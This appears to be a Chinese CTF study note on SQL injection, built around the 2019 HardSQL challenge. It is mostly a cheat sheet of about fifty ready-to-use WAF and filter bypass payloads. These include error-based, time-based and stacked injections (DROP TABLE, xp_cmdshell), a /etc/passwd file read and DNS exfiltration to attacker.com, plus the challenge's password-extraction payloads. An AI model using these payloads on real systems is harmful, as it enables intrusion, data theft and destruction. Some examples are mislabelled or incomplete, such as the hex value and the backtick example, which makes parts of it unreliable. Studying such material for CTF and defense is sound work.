过滤补充

  • [极客大挑战 2019]HardSQL
  • 空格过滤 → 用//或%a0绕过
    UNION/    /SELECT/**/1,2,3

等号=过滤 → 用LIKE或RLIKE替代
’ OR 1 LIKE 1–

单引号过滤 → 十六进制编码字符串
SELECT * FROM users WHERE username=0x61646d696e

逗号过滤 → 使用JOIN或FROM子句
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b

union过滤 → 大小写混合UnIoN
’ uNiOn SeLeCt 1,2,3–

select过滤 → 嵌套子查询
’ AND (SELECT 1)=(SELECT 1 FROM users)–

注释符过滤(–,#) → 利用||‘闭合
’ OR ‘1’=‘1’||’

and/or过滤 → 用&&和||符号
’ || 1=1 –

数字过滤 → 用true/false或表达式
ORDER BY true

关键字过滤 → 内联注释/!50000select/
UNION /!50000SELECT/ 1,2,3

宽字节注入 → GBK编码利用
%df%27 UNION SELECT 1,2,3–

溢出混淆 → 超长无用参数
id=1’ AND 1=1 [附加5000个脏字符]

HTTP参数污染 → 重复参数
?id=1&id=2’ UNION SELECT 1,2–

JSON格式注入 → 伪造JSON结构
{“id”:"1’ UNION SELECT 1,2-- "}

分块传输编码 → 绕过WAF检测
Transfer-Encoding: chunked 分段发送恶意载荷

非常规协议 → HTTP/0.9请求
GET /?id=1’+UNION+SELECT+1,@@version HTTP/0.9

双重URL编码 → %2527代替单引号
%2527%20UNION%20SELECT%201,2–

Unicode规范化 → 利用ü转u
%C3%BC’ (ü解码后为u)

时间盲注替代 → 用SLEEP()代替布尔判断
’ AND IF(1=1,SLEEP(5),0)–

报错注入 → 利用数据库函数报错
’ AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)–

堆叠查询 → 用;执行多条语句
'; DROP TABLE users–

XML注入点 → 利用extractvalue()
’ AND extractvalue(1,CONCAT(0x7e,(SELECT @@version)))–

进制转换 → 二进制转十六进制
SELECT 0x313337 (137的十六进制)

反引号包裹 → 绕过关键字检测
UNION SELECT 1,2,3

空白符变体 → 用%09(tab)代替空格
UNION%09SELECT%091,2,3

函数嵌套 → 隐藏真实意图
’ OR MID(VERSION(),1,1)=‘5’–

逻辑等价替换 → 1=1换成NOT 1=0
’ OR NOT 1=0 –

反斜杠转义绕过 → 双写转义符
’ OR 1='1 (当过滤机制为addslashes时)

Cookie注入 → 绕过URL检测
Cookie: id=1’ UNION SELECT 1,2–

User-Agent注入 → 伪造浏览器头
User-Agent: ’ UNION SELECT 1,@@version–

X-Forwarded-For注入 → 伪造IP头
X-Forwarded-For: 127.0.0.1’, (SELECT @@version))–

文件读取绕过 → LOAD_FILE()替代
UNION SELECT LOAD_FILE(‘/etc/passwd’),1–

OOB带外通道 → DNS外传数据
’ UNION SELECT LOAD_FILE(CONCAT(‘\\’,(SELECT @@version),‘.attacker.com\test’))–

布尔盲注优化 → 位运算加速
’ OR ASCII(SUBSTR((SELECT @@version),1,1)) & 1 > 0 –

正则表达式绕过 → 利用RLIKE
’ WHERE username RLIKE ‘^a’ –

浮点数注入 → 科学计数法
’ OR 1E0 UNION SELECT 1,2 –

位运算绕过 → 用|和&
’ OR 1 | 1 = 1 –

JSON_EXTRACT注入 → MySQL 5.7+
’ AND JSON_EXTRACT(‘{“a”:1}’,‘$.a’)=1–

变量名混淆 → 别名覆盖
UNION SELECT @@version AS v,2,3

多语句拼接 → 用CONCAT_WS()
UNION SELECT CONCAT_WS(0x7e,@@version,@@datadir),2,3

存储过程 → 调用系统过程
'; EXEC xp_cmdshell(‘whoami’)–

动态执行 → 利用PREPARE
'; SET @a=0x73656c65637420404076657273696f6e; PREPARE b FROM @a; EXECUTE b;–

空字节截断 → %00绕过
‘%00’ OR 1=1 –

HTTP方法切换 → POST转GET
将注入载荷从POST参数移到GET参数

WAF探测绕过 → 分阶段注入
首次请求id=1’触发WAF学习，二次请求完整注入

突破限制的字符串截断技术

  • 核心字符串函数：
    • right(str, len)：返回字符串右侧的len个字符
      • 截取前半段: 1'or(updatexml(1,concat(0x7e,(select(left(password,25))from(H4rDsq1)),0x7e),1))#
      • 获取剩余部分: 1'or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))#
    • left(str, len)：返回字符串左侧的len个字符
    • substr(str, pos, len)：从位置pos开始返回len个字符
    • mid(str, pos, len)：功能同substr

二次注入

二次注入是什么

  • 次注入是指已 存储 （数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
  • 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。

无列名注入法

  • 这个技巧的精髓就是：用 UNION SELECT * FROM 表 结合自定义别名，把未知列名的表强行变成我们已知列名的表，从而读出任意列的数据
